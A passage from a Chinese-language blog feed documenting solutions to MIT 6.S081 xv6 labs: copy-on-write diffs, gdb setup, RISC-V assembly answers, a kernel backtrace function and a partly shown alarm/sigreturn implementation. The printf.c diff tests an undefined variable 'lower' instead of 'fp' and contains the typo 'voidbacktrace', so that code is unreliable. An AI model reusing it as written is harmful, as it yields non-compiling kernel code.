err;</span><span class="token prefix unchanged"> </span><span class="token line">    &#125;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    incrfcount((void*)pa); // increment reference count to pa</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  &#125;</span><span class="token prefix unchanged"> </span><span class="token line">  return 0;</span><span class="token prefix unchanged"> </span><span class="token line"></span></span>@@ -350,6 +348,9 @@ copyout(pagetable_t pagetable, uint64 dstva, char *src, uint64 len)<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">  while(len > 0)&#123;</span><span class="token prefix unchanged"> </span><span class="token line">    va0 = PGROUNDDOWN(dstva);</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    if (iscowpage(pagetable, va0)) &#123;</span><span class="token prefix inserted">+</span><span class="token line">      cowfault(pagetable, va0);</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    pa0 = walkaddr(pagetable, va0);</span><span class="token prefix unchanged"> </span><span class="token line">    if(pa0 == 0)</span><span class="token prefix unchanged"> </span><span class="token line">      return -1;</span></span>diff --git a/time.txt b/time.txtnew file mode 100644index 0000000..209e3ef<span class="token coord">--- /dev/null</span><span class="token coord">+++ b/time.txt</span><span class="token coord">@@ -0,0 +1 @@</span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">20</span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Implement-copy-on-write&quot;&gt;&lt;a href=&quot;#Implement-copy-on-write&quot; class=&quot;headerlink&quot; title=&quot;Implement copy-on write&quot;&gt;&lt;/a&gt;Implement copy-on</summary>
      
    
    
    
    <category term="操作系统" scheme="http://lordaeronesz.github.io/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
    <category term="操作系统" scheme="http://lordaeronesz.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="经验" scheme="http://lordaeronesz.github.io/tags/%E7%BB%8F%E9%AA%8C/"/>
    
    <category term="xv6" scheme="http://lordaeronesz.github.io/tags/xv6/"/>
    
  </entry>
  
  <entry>
    <title>MIT6.s081 2021 Lab Traps</title>
    <link href="http://lordaeronesz.github.io/2024/07/06/MIT6.s081-2021-Lab%20Traps/"/>
    <id>http://lordaeronesz.github.io/2024/07/06/MIT6.s081-2021-Lab%20Traps/</id>
    <published>2024-07-06T03:45:11.000Z</published>
    <updated>2024-07-07T08:04:10.879Z</updated>
    
    <content type="html"><![CDATA[<h1 id="使用gdb调试xv6内核"><a href="#使用gdb调试xv6内核" class="headerlink" title="使用gdb调试xv6内核"></a>使用gdb调试xv6内核</h1><p>从最近两个 Lab 开始，代码逻辑的复杂度明显上升，对内核进行调试可能是帮助理解操作系统机制的绝佳方法。因此在开始本 Lab 之前，我们先来配置一下针对 xv6 内核的 gdb 调试器。</p><ol><li>安装 <code>gdb-multiarch</code>.</li></ol><p>利用包管理工具进行安装，我使用的是 Ubuntu 系统，执行以下命令：</p><pre class="language-shell" data-language="shell"><code class="language-shell">sudo apt install gdb-multiarch</code></pre><ol><li>在 xv6 项目根目录下可以看到 <code>.gdbinit</code> 文件，其中已经写好了一些 <code>gdb</code> 的初始化选项，使用文本编辑器或 <code>cat</code> 命令查看：</li></ol><pre class="language-ini" data-language="ini"><code class="language-ini">set confirm off                                                         set architecture riscv:rv64                                             target remote 127.0.0.1:26000                                           symbol-file kernel/kernel                                               set disassemble-next-line auto           set riscv use-compressed-breakpoints yes</code></pre><ol><li>在 <code>~/.config/gdb/</code> 目录下的文件 <code>gdbinit</code> 中（没有则新建）添加安全加载路径，否则可能无法加载 <code>.gdbinit</code> 的配置。</li></ol><pre class="language-ini" data-language="ini"><code class="language-ini">add-auto-load-safe-path &lt;xv6项目的根目录>/.gdbinit</code></pre><ol><li>打开两个终端窗口（可以使用 tmux 进行分屏），都需要进入 xv6 根目录，第一个窗口输入 <code>make-qemu</code> 等待调试器连接，第二个窗口输入 <code>gdb-multiarch</code> 打开 <code>gdb</code>，如果前面配置正确，那么 <code>gdb</code> 并自动加载 <code>.gdbinit</code> 配置，与 <code>qemu</code> 连接，之后便可以开始正常调试了。</li></ol><p><img src="/2024/07/06/MIT6.s081-2021-Lab%20Traps/gdb.png" alt></p><h1 id="RISC-V-assembly"><a href="#RISC-V-assembly" class="headerlink" title="RISC-V assembly"></a>RISC-V assembly</h1><p>一些有关 RISC-V 汇编的问题，最好先通过网上博客或手册简单了解一下 RISC-V 的基本指令。</p><p><strong>Q1:</strong> </p><blockquote><p>Which registers contain arguments to functions? For example, which register holds 13 in main’s call to <code>printf</code>?</p></blockquote><p><strong>A1:</strong> </p><p>可以参考 RISC-V 的 <em>calling convention</em>，<code>a0</code> - <code>a7</code>: 这些寄存器用于传递函数的前八个整数或指针类型的参数，如果超出这些寄存器的数量，超出的部分会存放在栈上。观察指令 <code>li  a2,13</code> 可知，13 作为 <code>printf</code> 的第二个参数，存放在寄存器 <code>a2</code> 中。</p><p><img src="/2024/07/06/MIT6.s081-2021-Lab%20Traps/reg.png" alt></p><p><strong>Q2:</strong></p><blockquote><p>Where is the call to function <code>f</code> in the assembly code for main? Where is the call to <code>g</code>? (Hint: the compiler may inline functions.)</p></blockquote><p><strong>A2:</strong> </p><p>调用函数 <code>f</code> 和函数 <code>g</code> 的代码被编译器优化，直接计算出了结果 12，作为 <code>printf</code> 的参数存入寄存器 <code>a1</code> 中：</p><pre class="language-assembly" data-language="assembly"><code class="language-assembly">26:   45b1                    li  a1,12</code></pre><p><strong>Q3:</strong></p><blockquote><p>At what address is the function <code>printf</code> located?</p></blockquote><p><strong>A3:</strong> </p><p>位于 0x638 地址处。</p><p><strong>Q4:</strong></p><blockquote><p>What value is in the register <code>ra</code> just after the <code>jalr</code> to <code>printf</code> in <code>main</code>?</p></blockquote><p><strong>A4:</strong> 参考 <a href="https://pdos.csail.mit.edu/6.828/2021/readings/riscv-calling.pdf">riscv-calling</a>，<code>ra</code> 用来存储函数调用的返回地址，因此 <code>ra</code> 的值为 <code>jalr    1544(ra)</code> 的后一条指令地址，即 0x38.</p><p><strong>Q5:</strong></p><blockquote><p>Run the following code.</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">unsigned</span> <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0x00646c72</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"H%x Wo%s"</span><span class="token punctuation">,</span> <span class="token number">57616</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>What is the output? <a href="http://web.cs.mun.ca/~michael/c/ascii-table.html">Here’s an ASCII table</a> that maps bytes to characters.</p><p>The output depends on that fact that the RISC-V is little-endian. If the RISC-V were instead big-endian what would you set <code>i</code> to in order to yield the same output? Would you need to change <code>57616</code> to a different value?</p><p><a href="http://www.webopedia.com/TERM/b/big_endian.html">Here’s a description of little- and big-endian</a> and <a href="http://www.networksorcery.com/enp/ien/ien137.txt">a more whimsical description</a>.</p></blockquote><p><strong>A5:</strong></p><ul><li><code>%x</code> 用于输出一个无符号十六进制整数。</li><li><code>%s</code> 用于输出一个字符指针所指向的字符串，直到遇到空字符<code>\0</code>为止。</li></ul><p>小端模式下，57616 的 十六进制表示为 e110，<code>&amp;i</code> 首地址开始的字节分别为 <code>0x72, 0x6c, 0x64, 0x0</code>，对应 ASCII 表中的字符为 <code>r, l, d</code>，因此最终输出结果为 <code>He110 World</code>.</p><p>若采取大端模式，<code>i</code> 的值应当替换为 <code>0x726c6400</code>，57616 的值无需改变，因为十六进制的书写规则并没有改变（高位在左，低位在右）。</p><p><strong>Q6:</strong></p><blockquote><p>In the following code, what is going to be printed after <code>&#39;y=&#39;</code>? (note: the answer is not a specific value.) Why does this happen?</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"x=%d y=%d"</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></blockquote><p><strong>A6:</strong></p><p>关于可变参数的内容查看 《<em>C Programming Language 2nd Edition</em>》（K\&amp;R）的 7.3 节 <em>Variable-length Argument Lists</em>.</p><p>简而言之，这样的操作将引发<strong>未定义行为</strong>，此时 <code>ap</code> 指向了一个未知的内存区域，并将该区域的数据以整型的形式输出。</p><h1 id="Backtrace"><a href="#Backtrace" class="headerlink" title="Backtrace"></a>Backtrace</h1><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>思路其实很简单：对照 <a href="https://pdos.csail.mit.edu/6.828/2021/lec/l-riscv-slides.pdf">lecture notes</a> 给出的栈的结构，从当前栈帧的起始地址 <code>fp</code> 开始，<code>fp - 8</code> 的位置存放着当前函数调用的返回地址（上一次函数调用处的下一条指令地址），即我们 <strong>需要打印</strong> 的地址，<code>fp - 16</code> 的位置存放着上一次函数调用所在栈帧的起始地址，将该地址作为新的 <code>fp</code> 重复上述步骤即可。</p><p><img src="/2024/07/06/MIT6.s081-2021-Lab%20Traps/st.png" alt></p><p>关键问题是 <strong>什么时候停止</strong> ？可以看到上述 backtrace 的过程就好像是在遍历一个链表，当链表的 <code>next</code> 域为空指针时链表到达末尾，那 traceback 完成后<code>fp</code> 的值应该是什么？为了寻找这个问题的答案，我选择先不设置终止条件，让它一直向上搜索，最后发现，返回地址最终为一个很小的值，这个地址显然不是我们想要的，在此之前应该退出，即本次 traceback 的尽头是 0x80001c92.</p><p><img src="/2024/07/06/MIT6.s081-2021-Lab%20Traps/noterm.png" alt></p><p>但打印出来的函数调用的返回地址似乎并没有什么规律，因此我又尝试将遍历过程中的栈帧起始地址 <code>fp</code> 打印出来，得到以下结果：</p><p><img src="/2024/07/06/MIT6.s081-2021-Lab%20Traps/pfp.png" alt></p><p>结合提示：</p><blockquote><p>Xv6 allocates one page for each stack in the xv6 kernel at PAGE-aligned address.</p></blockquote><p>原因就很明显了，在打印第三个返回地址时，此时栈帧起始地址为 0x3fffffa000，注意该地址后 12 二进制数为 0，且页面大小为 4KB，因此该地址位于一个页面的起始地址。又因为 xv6 内核只为每个 <strong>内核栈</strong> 分配一个页面的存储空间，该页面的起始地址按页面大小对齐，所以此时已经到达一个内核栈的顶端，无需继续遍历。</p><p>弄清楚了这些，代码的编写就很简单了：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">backtrace</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"backtrace:\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    uint64 fp <span class="token operator">=</span> <span class="token function">r_fp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    uint64 top <span class="token operator">=</span> <span class="token function">PGROUNDUP</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">do</span> <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%p\n"</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span>uint64 <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>fp <span class="token operator">-</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        fp <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>uint64 <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>fp <span class="token operator">-</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">while</span> <span class="token punctuation">(</span>fp <span class="token operator">&lt;</span> top<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// reach the top of kernel stack</span><span class="token punctuation">&#125;</span></code></pre><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><pre class="language-diff" data-language="diff"><code class="language-diff"><span class="token coord">--- a/kernel/defs.h</span><span class="token coord">+++ b/kernel/defs.h</span>@@ -80,6 +80,7 @@ int             pipewrite(struct pipe*, uint64, int);<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">void            printf(char*, ...);</span><span class="token prefix unchanged"> </span><span class="token line">void            panic(char*) __attribute__((noreturn));</span><span class="token prefix unchanged"> </span><span class="token line">void            printfinit(void);</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">voidbacktrace(void); // here</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">// proc.c</span><span class="token prefix unchanged"> </span><span class="token line">int             cpuid(void);</span></span>diff --git a/kernel/printf.c b/kernel/printf.cindex e1347de..a068cbd 100644<span class="token coord">--- a/kernel/printf.c</span><span class="token coord">+++ b/kernel/printf.c</span>@@ -114,6 +114,23 @@ printf(char *fmt, ...)<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    release(&amp;pr.lock);</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">// here</span><span class="token prefix inserted">+</span><span class="token line">void backtrace(void) &#123;</span><span class="token prefix inserted">+</span><span class="token line">printf("backtrace:\n");</span><span class="token prefix inserted">+</span><span class="token line">uint64 fp = r_fp();</span><span class="token prefix inserted">+</span><span class="token line">uint64 top = PGROUNDUP(fp);</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">do &#123;</span><span class="token prefix inserted">+</span><span class="token line">printf("%p\n", *(uint64 *)(fp - 8));</span><span class="token prefix inserted">+</span><span class="token line">fp = *(uint64 *)(fp - 16);</span><span class="token prefix inserted">+</span><span class="token line">&#125; while (lower &lt; top);</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span><span class="token prefix inserted">+</span><span class="token line"></span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">void</span><span class="token prefix unchanged"> </span><span class="token line">panic(char *s)</span><span class="token prefix unchanged"> </span><span class="token line">&#123;</span></span>diff --git a/kernel/riscv.h b/kernel/riscv.hindex 1691faf..fae7bf3 100644<span class="token coord">--- a/kernel/riscv.h</span><span class="token coord">+++ b/kernel/riscv.h</span>@@ -331,6 +331,15 @@ sfence_vma()<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  asm volatile("sfence.vma zero, zero");</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">// here</span><span class="token prefix inserted">+</span><span class="token line">static inline uint64</span><span class="token prefix inserted">+</span><span class="token line">r_fp()</span><span class="token prefix inserted">+</span><span class="token line">&#123;</span><span class="token prefix inserted">+</span><span class="token line">  uint64 x;</span><span class="token prefix inserted">+</span><span class="token line">  asm volatile("mv %0, s0" : "=r" (x) );</span><span class="token prefix inserted">+</span><span class="token line">  return x;</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span><span class="token prefix inserted">+</span><span class="token line"></span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">#define PGSIZE 4096 // bytes per page</span><span class="token prefix unchanged"> </span><span class="token line">#define PGSHIFT 12  // bits of offset within a page</span></span>diff --git a/kernel/sysproc.c b/kernel/sysproc.cindex e8bcda9..f27c007 100644<span class="token coord">--- a/kernel/sysproc.c</span><span class="token coord">+++ b/kernel/sysproc.c</span>@@ -70,6 +70,7 @@ sys_sleep(void)<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    sleep(&amp;ticks, &amp;tickslock);</span><span class="token prefix unchanged"> </span><span class="token line">  &#125;</span><span class="token prefix unchanged"> </span><span class="token line">  release(&amp;tickslock);</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  backtrace(); // here</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  return 0;</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span></span></code></pre><h1 id="Alarm"><a href="#Alarm" class="headerlink" title="Alarm"></a>Alarm</h1><h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><p>目前为止感觉最复杂的一题，需要对 trap 机制有一个比较深入的理解，建议在上手之前先仔细阅读与 trap 有关的代码：<code>kernel/trampoline.S</code> 和 <code>kernel/trap.c</code>，这里也推荐一位博主写的两篇有关 xv6 的 trap 机制的博客：</p><p><a href="https://blog.csdn.net/zzy980511/article/details/130255251">6.S081——陷阱部分(一文读懂xv6系统调用)——xv6源码完全解析系列(5)</a></p><p><a href="https://blog.csdn.net/zzy980511/article/details/130642258">6.S081——补充材料——RISC-V架构中的异常与中断详解</a></p><h3 id="test0-invoke-handler"><a href="#test0-invoke-handler" class="headerlink" title="test0: invoke handler"></a>test0: invoke handler</h3><p>我们不妨按照提示的顺序来进行，不关注 <code>sys_sigreturn</code>，先把 <code>sys_sigalarm</code> 的功能实现。</p><p>实际上，<code>sys_sigalarm</code> 函数的功能很简单，只是简单地将用户态下传递的参数 <code>ticks</code> 和 <code>handler</code> 存入进程的 <code>struct proc</code> 结构体中。实现调用 <code>handler</code> 的操作需要在内核态下的 <code>usertrap</code> 中完成，具体来说，针对时钟中断导致的 trap 将在 <code>if(which_dev == 2)</code> 后的语句中被处理。有两个目标需要完成： <strong>定时</strong> 和 <strong>函数调用</strong> 。</p><p>定时的逻辑比较清楚，在 <code>struct proc</code> 中添加变量 <code>ticksum</code>，代表从上次 <code>handler</code> 处理完成开始进程累计的时钟中断次数，该变量在进程初始化时设置为 0，随后每次遇到时钟中断，都自增 1，如果自增后的值达到了设定的间隔 <code>ticks</code>，则将其复位为 0，调用 <code>handler</code> 函数。</p><p>函数调用是一个需要考虑的问题，这里不能直接利用函数指针 <code>handler</code> 进行函数调用，因为 <code>handler</code> 指向的函数位于用户空间下，而 <code>usertrap</code> 位于内核态下，页表的地址映射不同，无法直接根据用户空间下的虚拟地址进行寻址（直接调用引发的错误如下图所示），需要在本次中断结束返回到用户态之后执行。因此正确的做法应该是设置进程 <code>struct proc</code> 的 <code>epc</code> 寄存器为函数指针 <code>handler</code>，这样在中断处理完成，进程回到用户态并被 CPU 调度执行后，寄存器 <code>pc</code> 将被设置预先保存的 <code>epc</code> 的值，这样函数 <code>handler</code> 就被成功调度执行了。至此，test0 应该成功通过。</p><p><img src="/2024/07/06/MIT6.s081-2021-Lab%20Traps/nil.png" alt></p><p>在进入到 test1\&amp;2 之前，有必要说一说我的一些思考：在上面的讨论中，我们知道内核无法直接根据函数指针 <code>handler</code> 的值进行用户空间函数的调用，那能否在内核态下根据进程的用户态页表和给定的虚拟地址，利用软件地址转换机制（<code>vm.c</code> 中的 <code>walkaddr</code> 函数）来将用户空间的虚拟地址转换为物理地址进行寻址呢（这也是我最开始的想法）？答案是不行，因为即便是在内核态下，程序中的地址仍然是虚拟地址，也就是说即便知道用户态函数实际存储的物理地址，我们也只有在 <strong>给出一个虚拟地址，该虚拟地址经过内核页表地址转换之后，刚好得到了正确的物理地址，</strong> 才可能成功。而实际上，尽管内核 <code>KERNBASE</code> 到 <code>PHYSTOP</code> 地址都是直接映射，但内核页表中可能并没有所需要的页表项，因此，这并不会成功。</p><h3 id="test1-test2-resume-interrupted-code"><a href="#test1-test2-resume-interrupted-code" class="headerlink" title="test1/test2(): resume interrupted code"></a>test1/test2(): resume interrupted code</h3><p>test1 的目标是，存储和恢复中断处理前后的寄存器状态。那么问题就来了：为什么需要存储这些寄存器？需要存储哪些寄存器？</p><p>其实最开始，我是有些纠结寄存器状态的存储目的是什么，认为可能是与内核态和用户态切换有关，但仔细想想，这部分的工作应该是由 <code>trampoline.S</code> 和 <code>usertrapret</code> 来完成的，那么为什么还需要存储和恢复寄存器？</p><p>事实上，在系统未关闭中断的情况下，时钟中断可能在程序执行的任何时刻发生，且在返回到原程序位置继续执行之前还需要执行预先设定好的 <code>handler</code> 函数，那么寄存器状态的保存将是必要的。一方面在执行 <code>handler</code> 函数期间，如果 <code>handler</code> 函数包含一些对局部变量的处理，那么通用寄存器的值将会发生改变，从而使得中断返回时程序的执行结果与预期不符；另一方面，由于 <code>epc</code> 的值被手动改变，如果执行完 <code>handler</code> 之后不恢复中断发生时的保存的 <code>pc</code> 值，那么 <code>pc</code> 将会指向 <code>handler</code> 函数末尾的下一条指令，中断因此无法正常返回。 简单来说，这部分的操作相当于手动模拟了 <strong>线程</strong> 的切换。</p><p>另一个问题是：需要存储哪些寄存器？好吧，在解决这个 Lab 时我其实偷了点懒，没有去仔细琢磨，只是简单地将整个 <code>trapframe</code> 中所有的寄存器都保存下来。但根据上面的讨论，再结合 RISC-V 的 <em>calling convention</em>，应该不难得出答案。</p><p>最后的 test2 就比较简单了，目标是：</p><blockquote><p>Prevent re-entrant calls to the handler——if a handler hasn’t returned yet, the kernel shouldn’t call it again.</p></blockquote><p>解决的办法有很多，可以额外在 <code>strcut proc</code> 添加一个变量，用来表示进程当前是否正处在处理 <code>handler</code> 的过程中，如果是，则不进行 <code>ticksum</code> 的自增操作。这里我采用了一点 <strong>小技巧</strong> ：不添加额外的变量，而是在处理 <code>handler</code> 前将 <code>ticksum</code> 置为负数，并在自增前判断 <code>ticksum</code> 是否非负，在 <code>sys_sigreturn</code> 时再将它置为 0，本质上与添加变量的操作大差不差。</p><h2 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h2><pre class="language-diff" data-language="diff"><code class="language-diff">diff --git a/Makefile b/Makefileindex 7a7e380..bc4d47a 100644<span class="token coord">--- a/Makefile</span><span class="token coord">+++ b/Makefile</span>@@ -188,6 +188,7 @@ UPROGS=\<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">$U/_grind\</span><span class="token prefix unchanged"> </span><span class="token line">$U/_wc\</span><span class="token prefix unchanged"> </span><span class="token line">$U/_zombie\</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">$U/_alarmtest\</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span></span>diff --git a/kernel/proc.c b/kernel/proc.cindex 22e7ce4..80096f7 100644<span class="token coord">--- a/kernel/proc.c</span><span class="token coord">+++ b/kernel/proc.c</span>@@ -119,6 +119,7 @@ allocproc(void)<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">found:</span><span class="token prefix unchanged"> </span><span class="token line">  p->pid = allocpid();</span><span class="token prefix unchanged"> </span><span class="token line">  p->state = USED;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  p->ticksum = 0; // here</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">  // Allocate a trapframe page.</span><span class="token prefix unchanged"> </span><span class="token line">  if((p->trapframe = (struct trapframe *)kalloc()) == 0)&#123;</span></span>diff --git a/kernel/proc.h b/kernel/proc.hindex f6ca8b7..c1d5a23 100644<span class="token coord">--- a/kernel/proc.h</span><span class="token coord">+++ b/kernel/proc.h</span>@@ -105,4 +105,10 @@ struct proc &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  struct file *ofile[NOFILE];  // Open files</span><span class="token prefix unchanged"> </span><span class="token line">  struct inode *cwd;           // Current directory</span><span class="token prefix unchanged"> </span><span class="token line">  char name[16];               // Process name (debugging)</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">  int ticks;         // here</span><span class="token prefix inserted">+</span><span class="token line">  void (*handler)();</span><span class="token prefix inserted">+</span><span class="token line">  int ticksum;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">  struct trapframe strapframe;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;;</span></span>diff --git a/kernel/syscall.c b/kernel/syscall.cindex c1b3670..d4e5585 100644<span class="token coord">--- a/kernel/syscall.c</span><span class="token coord">+++ b/kernel/syscall.c</span>@@ -104,6 +104,8 @@ extern uint64 sys_unlink(void);<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">extern uint64 sys_wait(void);</span><span class="token prefix unchanged"> </span><span class="token line">extern uint64 sys_write(void);</span><span class="token prefix unchanged"> </span><span class="token line">extern uint64 sys_uptime(void);</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">extern uint64 sys_sigalarm(void); // here</span><span class="token prefix inserted">+</span><span class="token line">extern uint64 sys_sigreturn(void);</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">static uint64 (*syscalls[])(void) = &#123;</span><span class="token prefix unchanged"> </span><span class="token line">[SYS_fork]    sys_fork,</span></span>@@ -127,6 +129,8 @@ static uint64 (*syscalls[])(void) = &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">[SYS_link]    sys_link,</span><span class="token prefix unchanged"> </span><span class="token line">[SYS_mkdir]   sys_mkdir,</span><span class="token prefix unchanged"> </span><span class="token line">[SYS_close]   sys_close,</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">[SYS_sigalarm]  sys_sigalarm,  // here</span><span class="token prefix inserted">+</span><span class="token line">[SYS_sigreturn] sys_sigreturn,</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">void</span></span>diff --git a/kernel/syscall.h b/kernel/syscall.hindex bc5f356..a040610 100644<span class="token coord">--- a/kernel/syscall.h</span><span class="token coord">+++ b/kernel/syscall.h</span><span class="token coord">@@ -20,3 +20,5 @@</span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">#define SYS_link   19</span><span class="token prefix unchanged"> </span><span class="token line">#define SYS_mkdir  20</span><span class="token prefix unchanged"> </span><span class="token line">#define SYS_close  21</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">#define SYS_sigalarm  22  // here</span><span class="token prefix inserted">+</span><span class="token line">#define SYS_sigreturn 23</span></span>diff --git a/kernel/sysproc.c b/kernel/sysproc.cindex f27c007..ee859ed 100644<span class="token coord">--- a/kernel/sysproc.c</span><span class="token coord">+++ b/kernel/sysproc.c</span>@@ -96,3 +96,28 @@ sys_uptime(void)<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  release(&amp;tickslock);</span><span class="token prefix unchanged"> </span><span class="token line">  return xticks;</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">// here</span><span class="token prefix inserted">+</span><span class="token line">uint64 sys_sigalarm(void) &#123;</span><span class="token prefix inserted">+</span><span class="token line">struct proc *p = myproc();</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">if (argint(0, &amp;(p->ticks)) &lt; 0) &#123;</span><span class="token prefix inserted">+</span><span class="token line">return -1;</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">if (argaddr(1, (uint64 *)&amp;(p->handler)) &lt; 0) &#123;</span><span class="token prefix inserted">+</span><span class="token line">return -1;</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">return 0;</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">uint64 sys_sigreturn(void) &#123;</span><span class="token prefix inserted">+</span><span class="token line">struct proc *p = myproc();</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">// restore registers</span><span class="token prefix inserted">+</span><span class="token line">memmove(p->trapframe, &amp;(p->strapframe), sizeof(p->strapframe));</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">p->ticksum = 0;</span><span class="token prefix inserted">+</span><span class="token line">return 0;</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span></span>diff --git a/kernel/trap.c b/kernel/trap.cindex a63249e..447e6d8 100644<span class="token coord">--- a/kernel/trap.c</span><span class="token coord">+++ b/kernel/trap.c</span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span></span>@@ -77,8 +77,17 @@ usertrap(void)<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    exit(-1);</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">  // give up the CPU if this is a timer interrupt.</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">  if(which_dev == 2)</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  if(which_dev == 2) &#123;</span><span class="token prefix inserted">+</span><span class="token line">// here</span><span class="token prefix inserted">+</span><span class="token line">if (p->ticks > 0 &amp;&amp; p->ticksum >= 0 &amp;&amp; ++(p->ticksum) >= p->ticks) &#123;</span><span class="token prefix inserted">+</span><span class="token line">  // save registers</span><span class="token prefix 